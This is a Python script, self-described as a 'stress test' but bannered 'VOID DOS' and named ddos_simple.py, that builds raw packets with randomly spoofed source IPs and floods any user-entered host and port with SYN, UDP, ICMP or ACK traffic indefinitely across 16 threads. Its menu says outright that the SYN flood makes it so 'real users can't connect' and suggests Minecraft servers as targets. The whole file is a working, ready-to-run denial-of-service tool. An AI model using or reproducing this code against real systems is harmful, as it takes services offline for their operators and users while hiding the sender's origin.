#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
# ##  VOID Stress Test — raw socket packet engine, no hping3
# ##  Kali Linux / WSL  ·  @lfw.k4rma_
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

def _ensure_deps():
    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet")]:
        try:
            __import__(mod)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call(
                    [sys.executable,"-m","pip","install",pkg,"-q","--break-system-packages"],
                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                subprocess.check_call(
                    [sys.executable,"-m","pip","install",pkg,"-q"],
                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

_ensure_deps()

import struct, socket, random, threading, time, re
from rich.console  import Console
from rich.text     import Text
from rich.align    import Align
from rich.rule     import Rule
from rich.panel    import Panel
from rich.table    import Table
from rich.live     import Live
from rich          import box
import pyfiglet

console    = Console()
stop_event = threading.Event()

# ══════════════════════════════════════════════════════════════════
# PACKET CRAFTING ENGINE
# ══════════════════════════════════════════════════════════════════

def _checksum(data: bytes) -> int:
    """Standard RFC-1071 Internet checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def _rand_ip() -> str:
    """Random public-looking spoofed source IP."""
    while True:
        a = random.randint(1, 223)
        # avoid reserved ranges
        if a in (10, 127, 169, 172, 192):
            continue
        return (f"{a}.{random.randint(0,255)}."
                f"{random.randint(0,255)}.{random.randint(1,254)}")

def _rand_port() -> int:
    return random.randint(1024, 65535)

def _ip_header(src_ip: str, dst_ip: str, proto: int, payload_len: int) -> bytes:
    ihl     = 5
    ver     = 4
    tos     = 0
    tot_len = 20 + payload_len
    pkt_id  = random.randint(0, 65535)
    frag    = 0
    ttl     = random.randint(48, 128)
    chk     = 0
    src     = socket.inet_aton(src_ip)
    dst     = socket.inet_aton(dst_ip)
    hdr = struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl, tos, tot_len,
        pkt_id, frag, ttl, proto, chk, src, dst)
    chk = _checksum(hdr)
    return struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl, tos, tot_len,
        pkt_id, frag, ttl, proto, chk, src, dst)

# TCP flag constants
F_SYN = 0x002
F_ACK = 0x010
F_RST = 0x004
F_FIN = 0x001
F_PSH = 0x008

def _tcp_segment(src_ip: str, dst_ip: str,
                 sport: int, dport: int, flags: int) -> bytes:
    seq    = random.randint(0, 2**32 - 1)
    ack_n  = 0
    doff   = 5
    win    = random.randint(1024, 65535)
    chk    = 0
    urg    = 0
    off    = (doff << 4) | 0
    seg = struct.pack('!HHIIBBHHH',
        sport, dport, seq, ack_n, off, flags, win, chk, urg)
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 6, len(seg))
    chk = _checksum(pseudo + seg)
    return struct.pack('!HHIIBBHHH',
        sport, dport, seq, ack_n, off, flags, win, chk, urg)

def _udp_segment(src_ip: str, dst_ip: str,
                 sport: int, dport: int) -> bytes:
    data   = random.randbytes(random.randint(16, 512))
    length = 8 + len(data)
    chk    = 0
    seg = struct.pack('!HHHH', sport, dport, length, chk) + data
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src, dst, 0, 17, length)
    chk = _checksum(pseudo + seg[:8] + data)
    return struct.pack('!HHHH', sport, dport, length, chk) + data

def _icmp_packet() -> bytes:
    type_   = 8   # echo request
    code    = 0
    chk     = 0
    id_     = random.randint(0, 65535)
    seq     = random.randint(0, 65535)
    payload = random.randbytes(56)
    hdr = struct.pack('!BBHHH', type_, code, chk, id_, seq)
    chk = _checksum(hdr + payload)
    return struct.pack('!BBHHH', type_, code, chk, id_, seq) + payload

def _build_packet(mode_key: str, src_ip: str, dst_ip: str,
                  sport: int, dport: int) -> bytes:
    if mode_key == "SYN":
        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_SYN)
        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
    elif mode_key == "ACK":
        tcp = _tcp_segment(src_ip, dst_ip, sport, dport, F_ACK)
        return _ip_header(src_ip, dst_ip, 6, len(tcp)) + tcp
    elif mode_key == "UDP":
        udp = _udp_segment(src_ip, dst_ip, sport, dport)
        return _ip_header(src_ip, dst_ip, 17, len(udp)) + udp
    elif mode_key == "ICMP":
        icmp = _icmp_packet()
        return _ip_header(src_ip, dst_ip, 1, len(icmp)) + icmp
    return b''

# ══════════════════════════════════════════════════════════════════
# SHARED STATS (thread-safe)
# ══════════════════════════════════════════════════════════════════

class Stats:
    def __init__(self):
        self._lock    = threading.Lock()
        self.sent     = 0
        self.replies  = 0
        self.errors   = 0
        self.last_flag= ""
        self._history : list[tuple[float,int]] = []  # (timestamp, sent)
        self.start    = time.time()

    def add_sent(self, n: int = 1):
        with self._lock:
            self.sent += n
            now = time.time()
            self._history.append((now, self.sent))
            # keep last 3 seconds of data
            cutoff = now - 3.0
            self._history = [(t, s) for t, s in self._history if t >= cutoff]

    def add_reply(self, flag_str: str = ""):
        with self._lock:
            self.replies += 1
            if flag_str:
                self.last_flag = flag_str

    def add_error(self):
        with self._lock:
            self.errors += 1

    def pps(self) -> float:
        """Rolling 3-second packets-per-second rate."""
        with self._lock:
            if len(self._history) < 2:
                elapsed = time.time() - self.start
                return self.sent / elapsed if elapsed else 0
            oldest_t, oldest_s = self._history[0]
            newest_t, newest_s = self._history[-1]
            dt = newest_t - oldest_t
            if dt <= 0:
                return 0
            return (newest_s - oldest_s) / dt

    def snapshot(self):
        with self._lock:
            return {
                "sent":      self.sent,
                "replies":   self.replies,
                "errors":    self.errors,
                "last_flag": self.last_flag,
                "elapsed":   time.time() - self.start,
            }

# ══════════════════════════════════════════════════════════════════
# SENDER THREAD
# ══════════════════════════════════════════════════════════════════

def _sender(target_ip: str, target_port: int, mode_key: str, stats: Stats):
    try:
        proto = {
            "SYN": socket.IPPROTO_TCP,
            "ACK": socket.IPPROTO_TCP,
            "UDP": socket.IPPROTO_UDP,
            "ICMP": socket.IPPROTO_ICMP,
        }.get(mode_key, socket.IPPROTO_RAW)

        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setblocking(False)

        batch = 0
        while not stop_event.is_set():
            try:
                src_ip = _rand_ip()
                sport  = _rand_port()
                pkt    = _build_packet(mode_key, src_ip, target_ip, sport, target_port)
                sock.sendto(pkt, (target_ip, 0))
                batch += 1
                if batch >= 50:
                    stats.add_sent(batch)
                    batch = 0
            except BlockingIOError:
                time.sleep(0.0001)
            except Exception:
                stats.add_error()
                time.sleep(0.001)
        if batch:
            stats.add_sent(batch)
        sock.close()
    except PermissionError:
        console.print("\n  [bold red][!][/]  Raw sockets need root — run with sudo\n")
        stop_event.set()
    except Exception as e:
        stats.add_error()

# ══════════════════════════════════════════════════════════════════
# REPLY LISTENER THREAD
# ══════════════════════════════════════════════════════════════════

def _listener(target_ip: str, target_port: int, mode_key: str, stats: Stats):
    try:
        if mode_key in ("SYN", "ACK"):
            proto = socket.IPPROTO_TCP
        else:
            proto = socket.IPPROTO_ICMP

        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
        sock.settimeout(0.5)

        while not stop_event.is_set():
            try:
                pkt, addr = sock.recvfrom(65535)
                if addr[0] != target_ip:
                    continue

                if proto == socket.IPPROTO_TCP:
                    # skip IP header (variable length)
                    ip_ihl = (pkt[0] & 0x0f) * 4
                    if len(pkt) < ip_ihl + 20:
                        continue
                    tcph = struct.unpack('!HHIIBBHHH', pkt[ip_ihl:ip_ihl+20])
                    src_port = tcph[0]
                    if src_port != target_port:
                        continue
                    flags = tcph[5]
                    flag_str = _decode_tcp_flags(flags)
                    stats.add_reply(flag_str)

                elif proto == socket.IPPROTO_ICMP:
                    # ICMP echo reply type=0 or unreachable type=3
                    if len(pkt) < 21:
                        continue
                    icmp_type = pkt[20]
                    if icmp_type == 0:
                        stats.add_reply("ECHO REPLY")
                    elif icmp_type == 3:
                        stats.add_reply("PORT UNREACH")

            except socket.timeout:
                continue
            except Exception:
                continue
        sock.close()
    except Exception:
        pass

def _decode_tcp_flags(flags: int) -> str:
    parts = []
    if flags & F_SYN: parts.append("SYN")
    if flags & F_ACK: parts.append("ACK")
    if flags & F_RST: parts.append("RST")
    if flags & F_FIN: parts.append("FIN")
    if flags & F_PSH: parts.append("PSH")
    return "+".join(parts) if parts else f"0x{flags:02x}"

def _flag_meaning(flag_str: str) -> str:
    if "RST" in flag_str and "ACK" in flag_str: return "Port closed / server rejected"
    if "SYN" in flag_str and "ACK" in flag_str: return "Port OPEN — server responded"
    if "RST" in flag_str:                        return "Connection reset by server"
    if "ACK" in flag_str:                        return "Server acknowledged"
    if "ECHO" in flag_str:                       return "ICMP echo reply — server alive"
    if "UNREACH" in flag_str:                    return "Port unreachable (UDP closed)"
    return flag_str

# ══════════════════════════════════════════════════════════════════
# LIVE DASHBOARD (Rich)
# ══════════════════════════════════════════════════════════════════

def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
    filled = max(0, min(int(ratio * width), width))
    b = Text()
    b.append("█" * filled,          style=col)
    b.append("░" * (width - filled), style="dim")
    return b

def _make_dashboard(target: str, port: int, mode: dict,
                    stats: Stats, n_threads: int) -> Panel:
    snap   = stats.snapshot()
    pps    = stats.pps()
    sent   = snap["sent"]
    reps   = snap["replies"]
    errs   = snap["errors"]
    elap   = snap["elapsed"]
    last_f = snap["last_flag"]

    loss = ((sent - reps) / sent * 100) if sent else 100.0

    rate_ratio  = min(pps / 100_000, 1.0)
    reply_ratio = min(reps / max(sent, 1), 1.0)

    col    = mode["color"]
    label  = mode["label"]

    t = Table.grid(padding=(0, 2))
    t.add_column()
    t.add_column()
    t.add_column()
    t.add_column()

    t.add_row(
        Text("TARGET",  style="dim"),
        Text(f"{target}:{port}", style="bold yellow"),
        Text("MODE",    style="dim"),
        Text(label,     style=f"bold {col}"),
    )
    t.add_row(
        Text("SENT",    style="dim"),
        Text(f"{sent:,}",        style="bold white"),
        Text("RATE",    style="dim"),
        Text(f"{pps:,.0f} pps",  style="bold bright_red"),
    )
    t.add_row(
        Text("REPLIES", style="dim"),
        Text(f"{reps:,}", style="bold bright_green"),
        Text("LOSS",    style="dim"),
        Text(f"{loss:.1f}%",
             style="bright_green" if loss < 20 else ("yellow" if loss < 60 else "bright_red")),
    )
    t.add_row(
        Text("THREADS", style="dim"),
        Text(f"{n_threads} active", style="bold white"),
        Text("UP",      style="dim"),
        Text(f"{elap:.0f}s",  style="bold white"),
    )

    # Rate bar
    rate_row = Text()
    rate_row.append("  RATE   ", style="bold white")
    rate_row.append_text(_bar(rate_ratio, col=col))
    rate_row.append(f"  {pps:,.0f} pps", style=f"bold {col}")

    # Reply bar
    rep_row = Text()
    rep_row.append("  REPLY  ", style="bold white")
    rep_row.append_text(_bar(reply_ratio, col="bright_green"))
    rep_row.append(f"  {reps:,}", style="bold bright_green")

    # Last reply
    last_row = Text()
    if last_f:
        meaning = _flag_meaning(last_f)
        last_row.append("  LAST   ", style="bold white")
        last_row.append(f"{last_f}  ", style="bold yellow")
        last_row.append(f"→ {meaning}", style="dim")
    else:
        last_row.append("  LAST   ", style="bold white")
        last_row.append("waiting for reply...", style="dim")

    body = Text()
    body.append("\n")
    body.append_text(Text.assemble(("  ", ""), t.__rich_console__(console, console.options).__next__())) # fallback
    body.append("\n")

    # Compose panel content as a group
    from rich.console import Group
    content = Group(
        t,
        Text(""),
        rate_row,
        rep_row,
        last_row,
        Text(""),
        Text("  [Ctrl+C to stop]", style="dim red"),
    )

    return Panel(
        content,
        title=f"[bold bright_red]  VOID STRESS TEST  —  ∞ INFINITE  [/]",
        border_style="bright_red",
        box=box.DOUBLE_EDGE,
    )

# ══════════════════════════════════════════════════════════════════
# GEOGRAPHIC ATTACK MAP
# ══════════════════════════════════════════════════════════════════

MAP_LINES = [
    "                                                                                  ",
    "       ┌───────────┐          ┌────────┐   ┌─────────────────────────┐  ┌─────┐  ",
    "       │           │          │        │   │                         │  │     │  ",
    "       │  N.AMER   │          │ EUROPE │   │         A S I A         │  │ JAP │  ",
    "       │           │          │        │   │                         │  └─────┘  ",
    "       │           │          └────────┘   │                         │           ",
    "       └───────────┘                       └─────────────────────────┘           ",
    "                                                                                  ",
    "       ┌───────────┐     ┌──────────┐                          ┌──────────────┐  ",
    "       │           │     │          │                          │              │  ",
    "       │  S.AMER   │     │  AFRICA  │                          │   OCEANIA    │  ",
    "       │           │     │          │                          │              │  ",
    "       └───────────┘     └──────────┘                          └──────────────┘  ",
    "                                                                                  ",
    "                                                                                  ",
    "                                                                                  ",
]

# (row, col, region_key)
ATTACK_NODES = [
    (2, 10, "NAM"), (3, 14, "NAM"), (4,  8, "NAM"), (5, 12, "NAM"),
    (9,  9, "SAM"), (10,13, "SAM"), (11,  8,"SAM"),
    (2, 30, "EU"),  (3, 33, "EU"),  (4, 28, "EU"),
    (9, 27, "AFR"), (10,31, "AFR"), (11,25, "AFR"),
    (2, 46, "ASIA"),(3, 50, "ASIA"),(4, 43, "ASIA"),(5, 48, "ASIA"),
    (2, 62, "JAP"), (3, 64, "JAP"),
    (9, 58, "OCE"), (10,62, "OCE"), (11,55, "OCE"),
]

REGION_ORDER  = ["NAM","EU","ASIA","JAP","SAM","AFR","OCE"]
REGION_LABELS = {
    "NAM": "North America", "EU":  "Europe",
    "ASIA":"Asia",          "JAP": "Japan / Korea",
    "SAM": "South America", "AFR": "Africa",
    "OCE": "Oceania",
}

def _render_map(active: set) -> Text:
    grid = [list(row) for row in MAP_LINES]
    node_positions: dict[tuple,bool] = {}
    for row, col, region in ATTACK_NODES:
        node_positions[(row, col)] = region in active

    txt = Text()
    for r, row in enumerate(grid):
        for c, ch in enumerate(row):
            if (r, c) in node_positions:
                if node_positions[(r, c)]:
                    txt.append("◉", style="bold bright_red")
                else:
                    txt.append("·", style="dim red")
            elif ch in "┌┐└┘─│":
                txt.append(ch, style="dim red")
            else:
                txt.append(ch, style="dim white")
        txt.append("\n")
    return txt

def show_geo_attack_map(target: str, mode_label: str, mode_color: str):
    console.print()
    console.print(Rule("[bold bright_red]  GLOBAL ATTACK NETWORK  [/]", style="bright_red"))
    console.print()
    console.print(f"  [dim]Deploying nodes across[/] [bold bright_red]7 regions[/] "
                  f"[dim]— target:[/] [bold yellow]{target}[/]")
    console.print()

    active: set = set()
    MAP_HEIGHT = len(MAP_LINES)

    for i, region in enumerate(REGION_ORDER):
        active.add(region)
        n = sum(1 for _, _, r in ATTACK_NODES if r == region)
        console.print(f"  [bright_red]▶[/]  [bold white]{REGION_LABELS[region]:<16}[/]  "
                      f"[bright_red]{n} nodes[/]  [bold bright_green][ ONLINE ][/]")
        map_txt = _render_map(active)
        console.print(Align.center(map_txt))
        time.sleep(0.5)
        if region != REGION_ORDER[-1]:
            sys.stdout.write(f"\033[{MAP_HEIGHT + 1}A")
            sys.stdout.flush()

    console.print()
    console.print(Rule("[dim red]  CONVERGENCE  [/]", style="dim red"))
    console.print()
    frames = [
        f"  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]  [bold yellow]◎ {target}[/]  [dim red]·  ·  ·  ·  ·  ·  ·  ·  ·  ·[/]",
        f"  [red]──  ──  ──  ──  ──  ──  ──[/]  [bold yellow]◎ {target}[/]  [red]──  ──  ──  ──  ──  ──  ──[/]",
        f"  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]  [bold yellow]◎ {target}[/]  [bright_red]━━━━━━━━━━━━━━━━━━━━━━━━━━[/]",
        f"  [bold bright_red]█████████████████████████[/]  [bold yellow]◎ {target}[/]  [bold bright_red]█████████████████████████[/]",
    ]
    for frame in frames:
        console.print(frame)
        time.sleep(0.28)
    console.print()
    console.print(f"  [bold bright_red][!!!][/]  [bold white]ALL {len(ATTACK_NODES)} NODES LOCKED ON[/]  "
                  f"[bold yellow]{target}[/]  [bold {mode_color}]— {mode_label.upper()}[/]")
    console.print()
    console.print(Rule(style="bright_red"))
    console.print()

# ══════════════════════════════════════════════════════════════════
# BANNER & MENUS
# ══════════════════════════════════════════════════════════════════

def banner():
    console.clear()
    fig = pyfiglet.figlet_format("V O I D  D O S", font="doom")
    txt = Text()
    shades = ["bright_red","red","bright_red","red","bright_red","red"]
    for i, line in enumerate(fig.splitlines()):
        txt.append(line + "\n", style=shades[i % len(shades)])
    console.print(Align.center(txt))
    console.print(Align.center(Text(
        "raw socket engine  ·  no hping3  ·  Kali Linux  ·  @lfw.k4rma_\n",
        style="dim red")))
    console.print(Rule(style="bright_red"))

MODES = {
    "1": {"label": "SYN Flood",  "key": "SYN",  "color": "bright_red",
          "desc":  "Fake TCP handshakes — fills connection table, real users can't connect",
          "example": "Like calling a number 10,000x/sec so no one else gets through"},
    "2": {"label": "UDP Flood",  "key": "UDP",  "color": "bright_cyan",
          "desc":  "Random UDP datagrams — eats all available bandwidth",
          "example": "Like flooding a mailbox with junk so real mail can't arrive"},
    "3": {"label": "ICMP Flood", "key": "ICMP", "color": "yellow",
          "desc":  "Rapid ICMP echo requests — overwhelms the network interface",
          "example": "Like spamming pings until the server can't respond to anything"},
    "4": {"label": "ACK Flood",  "key": "ACK",  "color": "bright_magenta",
          "desc":  "Fake TCP acknowledgements — confuses stateful firewalls",
          "example": "Like replying 'I got it' to thousands of messages nobody sent"},
}

def show_mode_menu():
    console.print()
    console.print(Rule("[dim red]  SELECT FLOOD TYPE  [/]", style="dim red"))
    console.print()
    for num, m in MODES.items():
        console.print(f"  [bright_red][{num}][/]  [bold {m['color']}]{m['label']}[/]")
        console.print(f"       [dim]{m['desc']}[/]")
        console.print(f"       [dim italic]\"{m['example']}\"[/]")
        console.print()

def resolve(target: str) -> str:
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        return target
    try:
        ip = socket.gethostbyname(target)
        console.print(f"  [dim]Resolved:[/]  [bold yellow]{target}[/] → [bright_white]{ip}[/]")
        return ip
    except Exception:
        return target

# ══════════════════════════════════════════════════════════════════
# RUN — INFINITE ATTACK LOOP
# ══════════════════════════════════════════════════════════════════

N_THREADS = 16   # sender threads — raw sockets, no GIL bottleneck on send

def run(target: str, port: int, mode: dict):
    stats     = Stats()
    mode_key  = mode["key"]
    col       = mode["color"]
    label     = mode["label"]

    # Spawn sender threads
    senders = []
    for _ in range(N_THREADS):
        t = threading.Thread(
            target=_sender,
            args=(target, port, mode_key, stats),
            daemon=True
        )
        t.start()
        senders.append(t)

    # Spawn reply listener
    lt = threading.Thread(
        target=_listener,
        args=(target, port, mode_key, stats),
        daemon=True
    )
    lt.start()

    # Stop-on-input listener
    def _input_watch():
        while not stop_event.is_set():
            try:
                if input().strip().lower() == "stop":
                    stop_event.set()
            except Exception:
                break
    threading.Thread(target=_input_watch, daemon=True).start()

    # Rich Live dashboard
    try:
        from rich.console import Group
        with Live(
            console=console,
            refresh_per_second=4,
            screen=False,
        ) as live:
            while not stop_event.is_set():
                snap  = stats.snapshot()
                pps   = stats.pps()
                sent  = snap["sent"]
                reps  = snap["replies"]
                elap  = snap["elapsed"]
                last_f= snap["last_flag"]
                loss  = ((sent - reps) / sent * 100) if sent else 100.0

                rate_ratio  = min(pps / 100_000, 1.0)
                reply_ratio = min(reps / max(sent, 1), 1.0)

                rate_bar = Text()
                rate_bar.append("  RATE   ", style="bold white")
                rate_bar.append_text(_bar(rate_ratio, col=col))
                rate_bar.append(f"  {pps:,.0f} pps", style=f"bold {col}")

                rep_bar = Text()
                rep_bar.append("  REPLY  ", style="bold white")
                rep_bar.append_text(_bar(reply_ratio, col="bright_green"))
                rep_bar.append(f"  {reps:,}", style="bold bright_green")

                last_row = Text()
                if last_f:
                    last_row.append("  LAST   ", style="bold white")
                    last_row.append(f"{last_f}  ", style="bold yellow")
                    last_row.append(f"→ {_flag_meaning(last_f)}", style="dim")
                else:
                    last_row.append("  LAST   ", style="bold white")
                    last_row.append("waiting for reply...", style="dim")

                tbl = Table.grid(padding=(0, 2))
                tbl.add_column(); tbl.add_column()
                tbl.add_column(); tbl.add_column()
                tbl.add_row(
                    Text("TARGET",  style="dim"),
                    Text(f"{target}:{port}", style="bold yellow"),
                    Text("MODE",    style="dim"),
                    Text(label, style=f"bold {col}"),
                )
                tbl.add_row(
                    Text("SENT",    style="dim"),
                    Text(f"{sent:,}", style="bold white"),
                    Text("RATE",    style="dim"),
                    Text(f"{pps:,.0f} pps", style="bold bright_red"),
                )
                tbl.add_row(
                    Text("REPLIES", style="dim"),
                    Text(f"{reps:,}", style="bold bright_green"),
                    Text("LOSS",    style="dim"),
                    Text(f"{loss:.1f}%",
                         style="bright_green" if loss < 20 else
                               ("yellow" if loss < 60 else "bright_red")),
                )
                tbl.add_row(
                    Text("THREADS", style="dim"),
                    Text(f"{N_THREADS} senders", style="bold white"),
                    Text("UP",      style="dim"),
                    Text(f"{elap:.0f}s", style="bold white"),
                )

                panel = Panel(
                    Group(tbl, Text(""), rate_bar, rep_bar, last_row,
                          Text(""), Text("  type stop + Enter or Ctrl+C to halt", style="dim red")),
                    title="[bold bright_red]  VOID STRESS TEST  —  ∞ INFINITE  [/]",
                    border_style="bright_red",
                    box=box.DOUBLE_EDGE,
                )
                live.update(panel)
                time.sleep(0.25)

    except KeyboardInterrupt:
        stop_event.set()

    # Wait for threads
    for t in senders:
        t.join(timeout=1.0)

    # Final summary
    snap  = stats.snapshot()
    pps   = stats.pps()
    sent  = snap["sent"]
    reps  = snap["replies"]
    elap  = snap["elapsed"]
    loss  = ((sent - reps) / sent * 100) if sent else 100.0
    pps_a = sent / elap if elap else 0

    console.print()
    console.print(Rule("[bold bright_red]  SESSION SUMMARY  [/]", style="bright_red"))
    console.print()
    console.print(f"  [dim]Target          [/]  [bold yellow]{target}:{port}[/]")
    console.print(f"  [dim]Mode            [/]  [bold {col}]{label}[/]")
    console.print(f"  [dim]Engine          [/]  [bold white]Pure Python raw sockets ({N_THREADS} threads)[/]")
    console.print(f"  [dim]Packets sent    [/]  [bold white]{sent:,}[/]")
    console.print(f"  [dim]Replies received[/]  [bold white]{reps:,}[/]")
    console.print(f"  [dim]Packet loss     [/]  "
                  f"[{'bright_green' if loss<20 else 'bright_red'}]{loss:.1f}%[/]")
    console.print(f"  [dim]Avg rate        [/]  [bold white]{pps_a:,.0f} pps[/]")
    console.print(f"  [dim]Duration        [/]  [bold white]{elap:.1f}s[/]")
    console.print()

    if loss >= 80:
        v = "[bold bright_red]Server dropped most packets — firewall or port closed[/]"
    elif loss >= 40:
        v = "[bold yellow]Server struggling — high packet loss detected[/]"
    elif reps > 0 and loss < 20:
        v = "[bold bright_green]Server responding — packets getting through[/]"
    else:
        v = "[bold dim]No significant reply data captured[/]"

    console.print(f"  [dim]Verdict  [/]  {v}")
    console.print()
    console.print(Rule(style="bright_red"))

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    # Root check
    if os.geteuid() != 0:
        banner()
        console.print(f"\n  [bold red][!][/]  Raw sockets need root.\n"
                      f"  [dim]Fix:  sudo python3 ddos_simple.py[/]\n")
        return

    banner()
    console.print()

    # Target
    console.print("  [bright_red]◈[/]  ", end="")
    target = input("Target IP or hostname: ").strip()
    if not target:
        console.print("  [red]No target. Abort.[/]"); return
    target = resolve(target)

    # Port
    console.print("  [bright_red]◈[/]  ", end="")
    port_raw = input("Port (default 80, Minecraft = 25565): ").strip()
    port = int(port_raw) if port_raw.isdigit() else 80

    # Mode
    show_mode_menu()
    console.print("  [bright_red]◈[/]  ", end="")
    choice = input("Choice (1-4, default 1): ").strip()
    mode = MODES.get(choice, MODES["1"])

    # Confirm
    console.print()
    console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
    console.print(f"  [dim]Target [/]  [bold yellow]{target}:{port}[/]")
    console.print(f"  [dim]Mode   [/]  [bold {mode['color']}]{mode['label']}[/]  "
                  f"[dim]— {mode['desc']}[/]")
    console.print(f"  [dim]Engine [/]  [bold white]Pure Python raw sockets · {N_THREADS} threads · ∞ infinite[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ", end="")
    confirm = input("Start? (Y/N): ").strip().lower()
    if confirm not in ("y", "yes"):
        console.print("\n  [yellow]Aborted.[/]\n"); return

    # Geo attack map
    show_geo_attack_map(target, mode["label"], mode["color"])

    # Countdown
    for i in range(3, 0, -1):
        console.print(f"\r  [bold bright_red][!][/]  [bold white]Firing in [bright_red]{i}[/]...[/]", end="")
        time.sleep(1)
    console.print(f"\r  [bold bright_red][!!!][/]  [bold bright_red]FIRING — {N_THREADS} THREADS — RAW SOCKETS             [/]")
    console.print()

    try:
        run(target, port, mode)
    except KeyboardInterrupt:
        stop_event.set()
        console.print("\n  [yellow]Stopped.[/]\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n  [bold red][!][/]  {e}\n")
